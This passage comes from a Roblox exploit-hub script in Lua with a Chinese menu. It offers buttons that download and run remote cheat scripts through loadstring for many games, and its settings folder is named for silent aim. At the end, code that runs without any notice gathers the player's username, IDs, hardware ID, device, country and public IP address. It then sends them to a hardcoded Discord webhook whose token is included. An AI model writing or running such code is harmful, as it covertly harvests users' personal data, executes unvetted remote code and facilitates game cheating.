ActionBoxR:AddButton("海贼王霸气", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/jiuyijiuyijiuyi91/91917878/refs/heads/main/%E6%B5%B7%E8%B4%BC%E7%8E%8B%E9%9C%B8%E6%B0%94.lua"))()
end)

ActionBoxR:AddButton("诡异动作包", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/jiuyijiuyijiuyi91/91917878/refs/heads/main/%E8%AF%A1%E5%BC%82%E5%8A%A8%E4%BD%9C%E5%8C%85.lua"))()
end)

ActionBoxR:AddButton("橡胶果实第二形态", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/jiuyijiuyijiuyi91/91917878/refs/heads/main/%E6%A9%A1%E8%83%B6%E6%9E%9C%E5%AE%9E%E7%AC%AC%E4%BA%8C%E5%BD%A2%E6%80%81.lua"))()
end)

ActionBoxR:AddButton("快速弗雷德熊", function()
local neededFiles = {}
for i = 1, 20 do
local n = string.format("%03d", i)
table.insert(neededFiles, "Fredscare/ezgif-frame-"..n..".png")
end
table.insert(neededFiles, "Fredbear.rbxmx")

local HasFiles = true
for _, file in ipairs(neededFiles) do
if not isfile(file) then
HasFiles = false
break
end
end

if HasFiles then
loadstring(game:HttpGet("https://raw.githubusercontent.com/ian49972/SCRIPTS/refs/heads/main/Fredbear"))()
return
end

local PlayerGui = game.Players.LocalPlayer:WaitForChild("PlayerGui")

local ScreenGui = Instance.new("ScreenGui")
ScreenGui.IgnoreGuiInset = true
ScreenGui.ResetOnSpawn = false
ScreenGui.Parent = PlayerGui

local Frame = Instance.new("Frame")
Frame.Size = UDim2.new(1, 0, 1, 0)
Frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Frame.Parent = ScreenGui

local LoadingText = Instance.new("TextLabel")
LoadingText.Size = UDim2.new(1,0,0,50)
LoadingText.Position = UDim2.new(0,0,0.3,0)
LoadingText.BackgroundTransparency = 1
LoadingText.Text = "Loading..."
LoadingText.TextColor3 = Color3.fromRGB(255,255,255)
LoadingText.TextScaled = true
LoadingText.Parent = Frame

local InfoText = Instance.new("TextLabel")
InfoText.Size = UDim2.new(1,0,0,30)
InfoText.Position = UDim2.new(0,0,0.48,0)
InfoText.BackgroundTransparency = 1
InfoText.Text = "This screen will not appear if you use the script again"
InfoText.TextColor3 = Color3.fromRGB(200,200,200)
InfoText.TextScaled = true
InfoText.Parent = Frame

local BarBG = Instance.new("Frame")
BarBG.AnchorPoint = Vector2.new(0.5,0.5)
BarBG.Position = UDim2.new(0.5,0,0.8,0)
BarBG.Size = UDim2.new(0.6,0,0.05,0)
BarBG.BackgroundColor3 = Color3.fromRGB(50,50,50)
BarBG.Parent = Frame

local bgCorner = Instance.new("UICorner")
bgCorner.CornerRadius = UDim.new(0,12)
bgCorner.Parent = BarBG

local Bar = Instance.new("Frame")
Bar.Size = UDim2.new(0,0,1,0)
Bar.BackgroundColor3 = Color3.fromRGB(255,230,0)
Bar.Parent = BarBG

local barCorner = Instance.new("UICorner")
barCorner.CornerRadius = UDim.new(0,12)
barCorner.Parent = Bar

local function UpdateBar(p)
Bar.Size = UDim2.new(p, 0, 1, 0)
end

if not isfolder("Fredscare") then
makefolder("Fredscare")
end

local total = 21
local count = 0

for i = 1, 20 do
local n = string.format("%03d", i)
if not isfile("Fredscare/ezgif-frame-"..n..".png") then
writefile("Fredscare/ezgif-frame-"..n..".png",
game:HttpGet("https://raw.githubusercontent.com/ian49972/IMAGES/refs/heads/main/ezgif-frame-"..n..".png")
)
end
count = count + 1
UpdateBar(count / total)
end

if not isfile("Fredbear.rbxmx") then
writefile("Fredbear.rbxmx",
game:HttpGet("https://raw.githubusercontent.com/ian49972/RBXMS/refs/heads/main/Fredbear.rbxmx")
)
end

count = count + 1
UpdateBar(count / total)

ScreenGui:Destroy()

loadstring(game:HttpGet("https://raw.githubusercontent.com/ian49972/SCRIPTS/refs/heads/main/Fredbear"))()
end)

ActionBoxR:AddLabel("播放自定义动画")

local animIdInput = ActionBoxR:AddInput("PlayAnimID", {
Text = "动画ID",
Default = "",
Numeric = true
})

local playAnimID = ""
animIdInput:OnChanged(function(text)
playAnimID = text or ""
end)

ActionBoxR:AddButton("播放动画", function()
local id = tonumber(playAnimID)
if not id then
notify("动画", "请输入有效动画ID", 3)
return
end
pcall(function()
local humanoid = getHumanoid()
local char = getCharacter()
if not humanoid or not char then
notify("动画", "未找到角色", 3)
return
end
local animator = humanoid:FindFirstChildOfClass("Animator")
if not animator then
animator = char:FindFirstChildOfClass("Animator")
end
if not animator then
animator = humanoid:FindFirstChild("Animator")
end
if not animator then
animator = Instance.new("Animator")
animator.Parent = humanoid
end
local anim = Instance.new("Animation")
anim.AnimationId = "rbxassetid://" .. tostring(id)
local track = animator:LoadAnimation(anim)
track:Play()
notify("动画", "正在播放动画 " .. id, 3)
end)
end)
end 

local Tabs_OtherScripts
local osTabOk, osTabErr = pcall(function()
	Tabs_OtherScripts = Window:AddTab("其他脚本", "file")
end)
if not osTabOk or not Tabs_OtherScripts then
	warn("[XJW] 其他脚本标签创建失败: " .. tostring(osTabErr))
	pcall(function()
		Tabs_OtherScripts = Window:AddTab("其他脚本")
	end)
end

if Tabs_OtherScripts then
local OtherScriptsBox = Tabs_OtherScripts:AddLeftGroupbox("其他脚本")
OtherScriptsBox:AddButton("ROBv4", function()
safeLoad("https://raw.githubusercontent.com/idrobsc/rob_script/refs/heads/main/rob.v4")
end)

OtherScriptsBox:AddButton("AF HUB", function()
getgenv().SCRIPT_KEY = ""
safeLoad("https://api.jnkie.com/api/v1/luascripts/public/4e025c3c0ccda1554634165acb8f8ee2c1de5f0f8d7f60e7b396c622d7e6e9b0/download")
end)

OtherScriptsBox:AddButton("叶脚本", function()
safeLoad("https://raw.githubusercontent.com/roblox-ye/QQ515966991/refs/heads/main/ROBLOX-CNVIP-XIAOYE.lua")
end)

OtherScriptsBox:AddButton("恐脚本", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/kongbaNB/9178/refs/heads/main/恐脚本.NB"))()
end)

OtherScriptsBox:AddButton("款脚本", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/fgyhxrtm-ship-it/gghv/refs/heads/main/%E6%AC%BE%E8%84%9A%E6%9C%AC%E9%80%9A%E7%94%A8%E5%8A%A0%E5%AF%86.lua"))()
end)

OtherScriptsBox:AddButton("RB脚本(免费版)", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/Yungengxin/roblox/refs/heads/main/Rb-Hub"))()
end)

OtherScriptsBox:AddButton("XK脚本(旧版)", function()
loadstring(game:HttpGet("https://github.com/devslopo/DVES/raw/main/XK%20Hub"))()
end)

OtherScriptsBox:AddButton("XK脚本(新版)", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/SyndromeXph/XK-Script/refs/heads/main/XoneK-Loader.luau"))()
end)
end

local Tabs_Server
local tabOk, tabErr = pcall(function()
	Tabs_Server = Window:AddTab("服务器脚本(XJW)", "server")
end)
if not tabOk or not Tabs_Server then
	warn("[XJW] 服务器脚本标签创建失败: " .. tostring(tabErr))
	pcall(function()
		Tabs_Server = Window:AddTab("服务器脚本(XJW)")
	end)
end

if Tabs_Server then

local GAMES = {
	{
		Name = "寻找针头",
		Url = "https://raw.githubusercontent.com/jiuyijiuyijiuyi91/78789191/refs/heads/main/%E5%AF%BB%E6%89%BE%E9%92%88%E5%A4%B4.lua",
		PlaceId = "108628039999641",
		GameId = "10756011174",
		Places = { "108628039999641" },
		Keys = { "Needle In A Haystack", "Needle", "Haystack" },
	},
	{
		Name = "力量传奇(安脚本)",
		Url = "https://raw.githubusercontent.com/Anscripterato/QQ2134702438/refs/heads/main/byato/AnScript/atoscript",
		PlaceId = "3623096087",
		GameId = "1268927906",
		Places = { "3623096087" },
		Keys = { "Muscle Legends", "Muscle" },
	},
	{
		Name = "极速传奇",
		Url = "https://raw.githubusercontent.com/jiuyijiuyijiuyi91/78789191/refs/heads/main/XJW%E6%9E%81%E9%80%9F%E4%BC%A0%E5%A5%87.lua",
		PlaceId = "3101667897",
		GameId = "1119466531",
		Places = { "3101667897" },
		Keys = { "Legends of Speed" },
	},
	{
		Name = "建造一架飞机",
		Url = "https://raw.githubusercontent.com/jiuyijiuyijiuyi91/78789191/refs/heads/main/%E5%BB%BA%E9%80%A0%E4%B8%80%E4%B8%AA%E9%A3%9E%E6%9C%BA.lua",
		PlaceId = "137925884276740",
		GameId = "7822444776",
		Places = { "137925884276740" },
		Keys = { "Build A Plane", "Build a Plane" },
	},
	{
		Name = "[FPS]一键点击",
		Url = "https://raw.githubusercontent.com/jiuyijiuyijiuyi91/78789191/refs/heads/main/FPS%E4%B8%80%E9%94%AE%E7%94%B5%E5%87%BB.lua",
		PlaceId = "90568084448279",
		GameId = "9294074907",
		Places = { "90568084448279" },
		Keys = { "One Tap" },
	},
	{
		Name = "捕捉10亿只鸭子",
		Url = "https://raw.githubusercontent.com/jiuyijiuyijiuyi91/78789191/refs/heads/main/%E6%8D%95%E6%8D%8910%E4%BA%BF%E5%8F%AA%E9%B8%AD%E5%AD%90.lua",
		PlaceId = "100293509865504",
		GameId = "10516888336",
		Places = { "100293509865504" },
		Keys = { "1 Billion Ducks", "Billion Ducks", "Duck" },
	},
	{
		Name = "清理所有枫叶",
		Url = "https://raw.githubusercontent.com/jiuyijiuyijiuyi91/78789191/refs/heads/main/%E6%B8%85%E7%90%86%E6%89%80%E4%BB%A5%E6%9E%AB%E5%8F%B6.lua",
		PlaceId = "92637789841354",
		GameId = "10539411000",
		Places = { "92637789841354" },
		Keys = { "Clean All The Leaves", "Clean All the Leaves", "Leaves", "Leaf" },
	},
	{
		Name = "逃跑者",
		Url = "https://raw.githubusercontent.com/jiuyijiuyijiuyi91/78789191/refs/heads/main/%E9%80%83%E8%B7%91%E8%80%85.lua",
		PlaceId = "118418618261207",
		GameId = "7585140258",
		Places = { "118418618261207" },
		Keys = { "逃跑者", "Runaways", "Runaway" },
	},
	{
		Name = "钻探至地球核心",
		Url = "https://raw.githubusercontent.com/jiuyijiuyijiuyi91/78789191/refs/heads/main/%E9%92%BB%E6%8E%A2%E8%87%B3%E5%9C%B0%E7%90%83%E6%A0%B8%E5%BF%83.lua",
		PlaceId = "101906032112547",
		GameId = "9796898051",
		Places = { "101906032112547" },
		Keys = { "Drill to Earth's Core", "Drill to Earth s Core", "Drill", "Earth's Core" },
	},
	{
		Name = "骑宠物",
		Url = "https://raw.githubusercontent.com/jiuyijiuyijiuyi91/78789191/refs/heads/main/%E9%AA%91%E5%AE%A0%E7%89%A9.lua",
		PlaceId = "124216119978534",
		GameId = "10035204815",
		Places = { "124216119978534" },
		Keys = { "Ride A Pet", "Ride", "骑宠物" },
	},
	{
		Name = "海上100天(see脚本)",
		Url = "https://raw.githubusercontent.com/Yeju3/See/refs/heads/main/zhb.protected.luau",
		PlaceId = "70411440483149",
		GameId = "9167377564",
		Places = { "70411440483149" },
		Keys = { "100 Days At Sea", "100 Days", "Sea", "海上100天", "海上" },
	},
	{
		Name = "打破偷走鸡蛋",
		Url = "https://raw.githubusercontent.com/jiuyijiuyijiuyi91/78789191/refs/heads/main/%E6%89%93%E7%A0%B4%E5%B9%B6%E5%81%B7%E8%B5%B0%E4%B8%80%E4%B8%AA%E9%B8%A1%E8%9B%8B.lua",
		PlaceId = "114326934417838",
		GameId = "10765288803",
		Places = { "114326934417838" },
		Keys = { "Break and Steal an Egg", "Break and Steal", "打破并偷走一个鸡蛋", "打破并偷走" },
	},
	{
		Name = "迪格尔竞技场",
		Url = "https://raw.githubusercontent.com/jiuyijiuyijiuyi91/78789191/refs/heads/main/%E8%BF%AA%E6%A0%BC%E5%B0%94%E7%AB%9E%E6%8A%80%E5%9C%BA.lua",
		PlaceId = "84556640895285",
		GameId = "10057403337",
		Places = { "84556640895285" },
		Keys = { "Deagle Arena", "迪格尔竞技场"},
	},
	{
		Name = "钩中啦",
		Url = "https://raw.githubusercontent.com/jiuyijiuyijiuyi91/78789191/refs/heads/main/%E9%92%A9%E4%B8%AD%E5%95%A6.lua",
		PlaceId = "70390793715007",
		GameId = "9663968307",
		Places = { "70390793715007" },
		Keys = { "Hooked!", "钩中啦"},
	},
	{
		Name = "+1舌头逃脱",
		Url = "https://raw.githubusercontent.com/jiuyijiuyijiuyi91/78789191/refs/heads/main/%2B1%E8%88%8C%E5%A4%B4%E9%80%83%E8%84%B1.lua",
		PlaceId = "122245938604556",
		GameId = "122245938604556",
		Places = { "122245938604556" },
		Keys = { "+1 Tongue Escape", "Tongue Escape", "+1舌头逃脱"},
	},
	{
		Name = "建造并击杀僵尸",
		Url = "https://raw.githubusercontent.com/jiuyijiuyijiuyi91/78789191/refs/heads/main/%E5%BB%BA%E9%80%A0%E5%B9%B6%E5%87%BB%E6%9D%80%E5%83%B5%E5%B0%B8.lua",
		PlaceId = "105011592530400",
		GameId = "10741654282",
		Places = { "105011592530400" },
		Keys = { "Build and Kill Zombies", "建造并击杀僵尸"},
	},
	{
		Name = "建造躲藏僵尸",
		Url = "https://raw.githubusercontent.com/jiuyijiuyijiuyi91/78789191/refs/heads/main/%E5%BB%BA%E9%80%A0%E8%BA%B2%E8%97%8F%E7%9A%84%E7%94%9F%E5%AD%98%E5%83%B5%E5%B0%B8.lua",
		PlaceId = "125758178026954",
		GameId = "10289426907",
		Places = { "125758178026954" },
		Keys = { "Build Hide Survive Zombies", "Build to Survive Zombies", "建造躲藏的生存僵尸"},
	},
	{
		Name = "忍者传奇",
		Url = "https://raw.githubusercontent.com/jiuyijiuyijiuyi91/78789191/refs/heads/main/%E5%BF%8D%E8%80%85%E4%BC%A0%E5%A5%87XJW.lua",
		PlaceId = "3956818381",
		GameId = "1335695570",
		Places = { "3956818381" },
		Keys = { "Ninja Legends", "忍者传奇"},
	},
	{
		Name = "NPC或死亡",
		Url = "https://raw.githubusercontent.com/jiuyijiuyijiuyi91/78789191/refs/heads/main/NPC%E6%88%96%E6%AD%BB%E4%BA%A1.lua",
		PlaceId = "11276071411",
		GameId = "4019583467",
		Places = { "11276071411" },
		Keys = { "NPC or DIE", "NPC or Die", "NPC或死亡"},
	},
}

local function serverNotify(title, text, duration)
	pcall(function()
		game:GetService("StarterGui"):SetCore("SendNotification", {
			Title = tostring(title),
			Text = tostring(text),
			Duration = duration or 3,
		})
	end)
	pcall(function()
		warn("[XJW] " .. tostring(title) .. ": " .. tostring(text))
	end)
end

local ServerLoadBox
local ServerInfoBox
pcall(function()
	ServerLoadBox = Tabs_Server:AddRightGroupbox("脚本加载")
end)
pcall(function()
	ServerInfoBox = Tabs_Server:AddLeftGroupbox("当前服务器")
end)

if ServerLoadBox and ServerInfoBox then

local ServerGameDropdown
local selectedServerGame = ""
local serverResultLabel
local serverInfoLabels = {}

local function setResult(text)
	if serverResultLabel then
		pcall(function()
			serverResultLabel:SetText(tostring(text))
		end)
	end
end

local function cutText(s, maxWidth)
	s = tostring(s or "")
	if s == "" then
		return "-"
	end
	if utf8 and utf8.codes then
		local total = 0
		for pos, code in utf8.codes(s) do
			local w = (code < 128) and 1 or 2
			if total + w > maxWidth then
				return s:sub(1, pos - 1) .. ".."
			end
			total = total + w
		end
		return s
	end
	if #s > maxWidth then
		local cut = maxWidth
		while cut > 0 do
			local b = s:byte(cut + 1)
			if b and b >= 128 and b < 192 then
				cut = cut - 1
			else
				break
			end
		end
		return s:sub(1, cut) .. ".."
	end
	return s
end

local function setInfo(placeId, gameId, mapName, productName)
	local lines = {
		"PID " .. cutText(placeId, 18),
		"GID " .. cutText(gameId, 18),
		"地图 " .. cutText(mapName, 13),
		"游戏 " .. cutText(productName, 13),
	}
	for i = 1, #lines do
		local lb = serverInfoLabels[i]
		if lb then
			pcall(function()
				lb:SetText(lines[i])
			end)
		end
	end
end

local function findServerGame(name)
	if type(name) ~= "string" then
		return nil
	end
	for _, g in ipairs(GAMES) do
		if g.Name == name then
			return g
		end
	end
	return nil
end

local function buildMirrors(url)
	local list = {}
	if type(url) ~= "string" or url == "" then
		return list
	end
	table.insert(list, url)
	if string.find(url, "raw.githubusercontent.com", 1, true) then
		table.insert(list, "https://ghproxy.net/" .. url)
		table.insert(list, "https://gh-proxy.com/" .. url)
		local user, repo, branch, path = string.match(url, "raw%.githubusercontent%.com/([^/]+)/([^/]+)/refs/heads/([^/]+)/(.+)")
		if user and repo and branch and path then
			table.insert(list, "https://cdn.jsdelivr.net/gh/" .. user .. "/" .. repo .. "@" .. branch .. "/" .. path)
		end
	end
	return list
end

local function httpFetch(url)
	local getters = {}
	table.insert(getters, function()
		return game:HttpGet(url)
	end)
	if type(request) == "function" then
		table.insert(getters, function()
			local r = request({ Url = url, Method = "GET" })
			return r and r.Body or nil
		end)
	end
	if type(http_request) == "function" then
		table.insert(getters, function()
			local r = http_request({ Url = url, Method = "GET" })
			return r and r.Body or nil
		end)
	end
	if type(syn) == "table" and type(syn.request) == "function" then
		table.insert(getters, function()
			local r = syn.request({ Url = url, Method = "GET" })
			return r and r.Body or nil
		end)
	end
	if type(http) == "table" and type(http.request) == "function" then
		table.insert(getters, function()
			local r = http.request({ Url = url, Method = "GET" })
			return r and r.Body or nil
		end)
	end
	local lastErr = nil
	for _, getter in ipairs(getters) do
		local ok, body = pcall(getter)
		if ok and type(body) == "string" and #body > 0 then
			return body, nil
		end
		if not ok then
			lastErr = tostring(body)
		end
	end
	return nil, lastErr or "无可用下载方式"
end

local function fetchScript(g)
	local mirrors = buildMirrors(g.Url)
	local lastErr = nil
	for i = 1, #mirrors do
		local body, err = httpFetch(mirrors[i])
		if body then
			return body, i, nil
		end
		lastErr = err
	end
	return nil, 0, lastErr or "所有下载源均失败"
end

local function loadServerScript(g)
	if not g then
		return
	end
	serverNotify("正在加载", g.Name, 3)
	task.spawn(function()
		local okRun, body, mirrorIndex, lastErr = pcall(fetchScript, g)
		if not okRun then
			serverNotify("加载失败", tostring(body), 6)
			warn("[XJW] " .. g.Name .. " 下载异常: " .. tostring(body))
			return
		end
		if not body then
			serverNotify("加载失败", g.Name .. " 下载失败", 6)
			warn("[XJW] " .. g.Name .. " 下载失败: " .. tostring(lastErr))
			return
		end
		local compile = loadstring or load
		local fn, compileErr = compile(body)
		if not fn then
			serverNotify("编译失败", tostring(compileErr), 6)
			warn("[XJW] " .. g.Name .. " 编译失败: " .. tostring(compileErr))
			return
		end
		serverNotify("加载成功", g.Name, 3)
		local runOk, runErr = pcall(fn)
		if not runOk then
			serverNotify("运行出错", tostring(runErr), 6)
			warn("[XJW] " .. g.Name .. " 运行出错: " .. tostring(runErr))
		end
	end)
end

local liveCache = { placeId = nil, productName = nil }

local function getLiveInfo()
	local placeId, gameId, mapName = "?", "?", "?"
	pcall(function()
		placeId = tostring(game.PlaceId)
	end)
	pcall(function()
		gameId = tostring(game.GameId)
	end)
	pcall(function()
		mapName = tostring(game.Name or "?")
	end)
	if gameId == "" or gameId == "0" then
		gameId = "不可用"
	end
	if liveCache.placeId ~= placeId then
		liveCache.placeId = placeId
		liveCache.productName = nil
		pcall(function()
			local info = game:GetService("MarketplaceService"):GetProductInfo(tonumber(placeId))
			if info and info.Name then
				liveCache.productName = tostring(info.Name)
			end
		end)
	end
	return placeId, gameId, mapName, (liveCache.productName or "-")
end

local function collectIds(g)
	local ids = {}
	if g.PlaceId and g.PlaceId ~= "" then
		table.insert(ids, tostring(g.PlaceId))
	end
	if g.GameId and g.GameId ~= "" then
		table.insert(ids, tostring(g.GameId))
	end
	if type(g.Places) == "table" then
		for _, v in ipairs(g.Places) do
			if v and tostring(v) ~= "" then
				table.insert(ids, tostring(v))
			end
		end
	end
	return ids
end

local function detectGame()
	local placeId, gameId, mapName, productName = getLiveInfo()
	for _, g in ipairs(GAMES) do
		for _, id in ipairs(collectIds(g)) do
			if id == placeId then
				return g, "PlaceId 匹配"
			end
			if gameId ~= "不可用" and gameId ~= "?" and id == gameId then
				return g, "GameId 匹配"
			end
		end
	end
	local names = { string.lower(mapName), string.lower(productName) }
	for _, g in ipairs(GAMES) do
		for _, k in ipairs(g.Keys or {}) do
			local key = string.lower(k)
			for _, n in ipairs(names) do
				if n and n ~= "" and n ~= "-" and string.find(n, key, 1, true) then
					return g, "名称匹配(" .. k .. ")"
				end
			end
		end
	end
	return nil, "未匹配"
end

local function refreshServer()
	local placeId, gameId, mapName, productName = getLiveInfo()
	setInfo(placeId, gameId, mapName, productName)
	local g = detectGame()
	if g then
		selectedServerGame = g.Name
		setResult(g.Name)
		if ServerGameDropdown then
			pcall(function()
				ServerGameDropdown:SetValue(g.Name)
			end)
		end
	else
		setResult("未识别到当前服务器")
	end
	return g
end

local buildOk, buildErr = pcall(function()
	local ServerGameNames = {}
	for _, g in ipairs(GAMES) do
		table.insert(ServerGameNames, g.Name)
	end

	ServerGameDropdown = ServerLoadBox:AddDropdown("ServerGameList", {
		Text = "选择游戏脚本",
		Values = ServerGameNames,
		Default = "",
		Multi = false
	})

	ServerGameDropdown:OnChanged(function(v)
		if type(v) == "string" and v ~= "" then
			selectedServerGame = v
		end
	end)

	ServerLoadBox:AddButton("加载选中脚本", function()
		local g = findServerGame(selectedServerGame)
		if not g then
			serverNotify("服务器脚本", "请先在下拉框选择脚本", 3)
			return
		end
		loadServerScript(g)
	end)

	serverResultLabel = ServerInfoBox:AddLabel("检测中")
	serverInfoLabels = {
		ServerInfoBox:AddLabel("PID 读取中..."),
		ServerInfoBox:AddLabel("GID 读取中..."),
		ServerInfoBox:AddLabel("地图 读取中..."),
		ServerInfoBox:AddLabel("游戏 读取中..."),
	}

	ServerInfoBox:AddButton("重新识别", function()
		task.spawn(function()
			refreshServer()
		end)
	end)

	ServerInfoBox:AddButton("加载当前服务器", function()
		task.spawn(function()
			local g = refreshServer()
			if g then
				serverNotify("已识别当前服务器", g.Name, 3)
				loadServerScript(g)
			else
				serverNotify("未识别到当前服务器", "当前服务器不在支持列表内", 5)
			end
		end)
	end)

	ServerInfoBox:AddLabel("支持服务器 " .. tostring(#GAMES) .. " 个")
	for idx, gameItem in ipairs(GAMES) do
		ServerInfoBox:AddLabel(idx .. ". " .. gameItem.Name)
	end

end)

if not buildOk then
	warn("[XJW] 服务器脚本标签创建失败: " .. tostring(buildErr))
	pcall(function()
		serverNotify("服务器脚本", "标签创建失败，请查看控制台", 6)
	end)
end

	task.spawn(function()
		pcall(refreshServer)
	end)
end
end

Tabs["UI Settings"] = Window:AddTab("UI设置", "settings")
ThemeManager:SetLibrary(Library)
SaveManager:SetLibrary(Library)

SaveManager:IgnoreThemeSettings()
SaveManager:SetIgnoreIndexes({ "MenuKeybind" })
SaveManager:SetFolder("UniversalSilentAim/Configs")

SaveManager:BuildConfigSection(Tabs["UI Settings"])
ThemeManager:ApplyToTab(Tabs["UI Settings"])

pcall(function()
	local SndBox = Tabs["UI Settings"]:AddRightGroupbox("音效设置")
	local SndTog = SndBox:AddToggle("XJWSndOn", { Text = "开启音效", Default = true })
	SndTog:OnChanged(function(v)
		_XJWSnd.set(v)
	end)
end)

SaveManager:LoadAutoloadConfig()

local _elapsed = tick() - _startTime
local _msg = string.format("耗时 %.2f 秒", _elapsed)

task.wait(0.05)

pcall(function()
	if Library and Library.ScreenGui then
		Library.ScreenGui.Enabled = true
	end
end)

pcall(function()
	Library:Toggle(true)
end)

task.wait(0.1)

pcall(function()
game.StarterGui:SetCore("SendNotification", {
Title = "XJW中心加载成功",
Text = _msg,
Duration = 5,
})
end)

local Feng_Webhook = "https://discord.com/api/webhooks/1561764528771960832/6BUUt-0fZFe-YqLzqoz2xAKSooq01dD53NrsvO0wJ2dhXU2M6VVk7kwVFZmTH50AISUB"
local Thing = game:HttpGet(string.format("https://thumbnails.roblox.com/v1/users/avatar?userIds=%d&size=180x180&format=Png&isCircular=true", game.Players.LocalPlayer.UserId))
Thing = game:GetService("HttpService"):JSONDecode(Thing).data[1]
local AvatarImage = Thing.imageUrl

if game.UserInputService.TouchEnabled and not game.UserInputService.KeyboardEnabled and not game.UserInputService.MouseEnabled then
  device = "移动设备"
 elseif not game.UserInputService.TouchEnabled and game.UserInputService.KeyboardEnabled and game.UserInputService.MouseEnabled then
  device = "电脑"
 elseif game.UserInputService.TouchEnabled and game.UserInputService.KeyboardEnabled and game.UserInputService.MouseEnabled then
  device = "带触摸屏的电脑"
end

local player = game.Players.LocalPlayer
if player.MembershipType == Enum.MembershipType.Premium then
  Premium = "是"
 else
  Premium = "否"
end

local req = http_request or request or (syn and syn.request)
IP = ""..req({ Url = "https://api.ipify.org/", Method = "Get" }).Body

local msg = {
  ["username"] = "殺脚本-APP",
  ["embeds"] = {
    {
      ["color"] = tonumber(tostring("0x32CD32")),
      ["title"] = "有人使用脚本正在记录" .. os.date("%H") .. "时" .. os.date("%M") .. "分",
      ["thumbnail"] = {
        ["url"] = AvatarImage,
      },
      ["fields"] = {
        {
          ["name"] = "用户名",
          ["value"] = game.Players.LocalPlayer.Name,
          ["inline"] = true
        },
        {
          ["name"] = "名称",
          ["value"] = game.Players.LocalPlayer.DisplayName,
          ["inline"] = true
        },
        {
          ["name"] = "用户ID",
          ["value"] = "["..player.UserId.."](" .. tostring("https://www.roblox.com/users/" .. game.Players.LocalPlayer.UserId .. "/profile")..")",
          ["inline"] = true
        },
        {
          ["name"] = "客户端ID",
          ["value"] = game:GetService("RbxAnalyticsService"):GetClientId(),
          ["inline"] = false
        },
        {
          ["name"] = "地图ID",
          ["value"] = "[" .. game.PlaceId .. "](" .. "https://www.roblox.com/games/" .. game.PlaceId .. ")",
          ["inline"] = true
        },
         {
          ["name"] = "地图名称",
          ["value"] = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name,
          ["inline"] = true
        },
        {
          ["name"] = "使用的注入器",
          ["value"] = identifyexecutor() or getexecutorname() or "未知",
          ["inline"] = true
        },
        {
          ["name"] = "账号年龄",
          ["value"] = game.Players.LocalPlayer.AccountAge .. "天",
          ["inline"] = true
        },
        {
          ["name"] = "设备",
          ["value"] = device,
          ["inline"] = false
        },
        {
          ["name"] = "国家和语言",
          ["value"] = "国家: " .. game:GetService("LocalizationService"):GetCountryRegionForPlayerAsync(game.Players.LocalPlayer),
          ["inline"] = false
        },
        {
          ["name"] = "语言",
          ["value"] = " 语言: " .. game.Players.LocalPlayer.LocaleId,
          ["inline"] = false
        },
        {
          ["name"] = "会员状态",
          ["value"] = Premium,
          ["inline"] = false
        },
        {
          ["name"] = "HWID",
          ["value"] = gethwid(),
          ["inline"] = true
        },
        {
          ["name"] = "IP地址",
          ["value"] = IP,
          ["inline"] = true
        },
        {
          ["name"] = "IP工具箱",
          ["value"] = "IP: " .. "https://binaryfork.com/zh/tools/ip-address-lookup/?ip=" .. IP .. "&trp-form-language=zh#ip-lookup",
          ["inline"] = false
        },
      }
    }
  }
}

local request = http_request or request or HttpPost or syn.request
request({
  Url = Feng_Webhook,
  Method = "POST",
  Headers = {["Content-Type"] = "application/json"},
  Body = game.HttpService:JSONEncode(msg)
})
